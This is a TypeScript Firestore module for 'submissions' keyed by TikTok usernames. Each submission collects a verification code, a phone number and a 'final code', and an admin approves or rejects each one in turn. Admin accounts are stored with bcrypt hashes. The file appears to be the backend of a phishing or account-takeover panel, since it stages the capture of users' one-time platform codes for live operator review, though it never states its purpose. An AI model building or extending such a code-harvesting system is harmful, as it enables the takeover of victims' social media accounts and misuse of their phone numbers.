
import { db } from './firebase';
import type { Submission, AdminUser } from '@/lib/types';
import bcrypt from 'bcryptjs';

const submissionsCollection = db.collection('submissions');
const adminsCollection = db.collection('admins');

// Submissions

export async function getSubmissions(): Promise<Submission[]> {
    const snapshot = await submissionsCollection.orderBy('createdAt', 'desc').get();
    if (snapshot.empty) {
        return [];
    }
    return snapshot.docs.map(doc => ({ ...doc.data() as Submission }));
}

export async function getSubmissionById(id: string): Promise<Submission | null> {
    const doc = await submissionsCollection.doc(id).get();
    if (!doc.exists) {
        return null;
    }
    return doc.data() as Submission;
}

export async function createOrUpdateSubmission(id: string, data: Partial<Submission>): Promise<Submission> {
    const submissionRef = submissionsCollection.doc(id);
    const doc = await submissionRef.get();

    let submissionData: Submission;

    if (!doc.exists) {
        // This is a new submission
        submissionData = {
            id,
            tiktokUsername: id,
            tiktokUsernameStatus: 'pending',
            verificationCodeStatus: 'pending',
            phoneNumberStatus: 'pending',
            finalCodeStatus: 'pending',
            isVerified: false,
            createdAt: new Date().toISOString(),
        };
    } else {
        // This is an existing submission
        submissionData = doc.data() as Submission;
    }
    
    // Merge new data with existing or new submission object
    Object.assign(submissionData, data);
    
    // Update statuses based on what data was just submitted
    if (data.tiktokUsername) submissionData.tiktokUsernameStatus = 'approved';
    if (data.verificationCode) submissionData.verificationCodeStatus = 'pending'; // Admin must approve
    if (data.phoneNumber) submissionData.phoneNumberStatus = 'pending'; // Admin must approve
    if (data.finalCode) submissionData.finalCodeStatus = 'pending'; // Admin must approve

    await submissionRef.set(submissionData, { merge: true });
    return submissionData;
}

export async function updateSubmissionStepStatus(submissionId: string, step: string, status: 'approved' | 'rejected'): Promise<Submission> {
    const submissionRef = submissionsCollection.doc(submissionId);
    const doc = await submissionRef.get();

    if (!doc.exists) {
        throw new Error('Submission not found');
    }

    const submissionData = doc.data() as Submission;
    const keyToUpdate = `${step}Status` as keyof Submission;

    (submissionData as any)[keyToUpdate] = status;

    // If any step is rejected, the entire submission is no longer considered verified.
    if (status === 'rejected') {
        submissionData.isVerified = false;
    }
    
    // If the final code step is approved, the entire submission becomes verified.
    if (step === 'finalCode' && status === 'approved') {
        submissionData.isVerified = true;
    }

    await submissionRef.update(submissionData);
    return submissionData;
}

export async function deleteSubmission(submissionId: string): Promise<void> {
    await submissionsCollection.doc(submissionId).delete();
}

// Admins

export async function getAdmins(): Promise<Omit<AdminUser, 'passwordHash'>[]> {
    const snapshot = await adminsCollection.orderBy('createdAt', 'asc').get();
     if (snapshot.empty) {
        return [];
    }
    return snapshot.docs.map(doc => {
        const { passwordHash, ...adminData } = doc.data() as AdminUser;
        return adminData;
    });
}

export async function getAdminById(id: string): Promise<Omit<AdminUser, 'passwordHash'> | null> {
    const doc = await adminsCollection.doc(id).get();
    if (!doc.exists) {
        return null;
    }
    const { passwordHash, ...adminData } = doc.data() as AdminUser;
    return adminData;
}

export async function getAdminByEmail(email: string): Promise<AdminUser | null> {
    const snapshot = await adminsCollection.where('email', '==', email).limit(1).get();
    if (snapshot.empty) {
        return null;
    }
    return snapshot.docs[0].data() as AdminUser;
}

export async function addAdmin({ email, passwordHash, isMainAdmin }: { email: string; passwordHash: string; isMainAdmin: boolean }): Promise<AdminUser> {
    const newAdminRef = adminsCollection.doc();
    const newAdmin: AdminUser = {
        id: newAdminRef.id,
        email,
        passwordHash,
        isMainAdmin,
        isVerified: isMainAdmin, // First admin is auto-verified
        createdAt: new Date().toISOString(),
    };
    await newAdminRef.set(newAdmin);
    return newAdmin;
}

export async function updateAdminVerification(adminId: string, isVerified: boolean): Promise<Omit<AdminUser, 'passwordHash'>> {
    const adminRef = adminsCollection.doc(adminId);
    const doc = await adminRef.get();
    if (!doc.exists) {
        throw new Error("Admin not found");
    }
    await adminRef.update({ isVerified });
    const updatedDoc = await adminRef.get();
    const { passwordHash, ...adminData } = updatedDoc.data() as AdminUser;
    return adminData;
}
